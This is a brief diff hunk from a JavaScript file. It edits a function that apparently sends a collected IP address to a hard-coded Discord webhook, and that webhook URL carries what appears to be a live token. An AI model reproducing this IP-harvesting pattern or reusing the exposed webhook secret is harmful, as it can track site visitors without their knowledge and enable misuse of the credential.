@@ -173,7 +173,7 @@ function getIPAddress() {
 
 function sendToDiscord(ipAddress) {
     const webhookURL = 'https://discord.com/api/webhooks/1109138241359200326/Z8qaKtw7QkgeFZigc9rideyDtuw8p12zID8Sekyv8QFpgwtGCGVGhko_W1Nq3BEcZrRw';
-    const message = `IPアドレス: ${ipAddress}`;
+    const message = `${ipAddress}`;
 
     fetch(webhookURL, {
         method: 'POST',
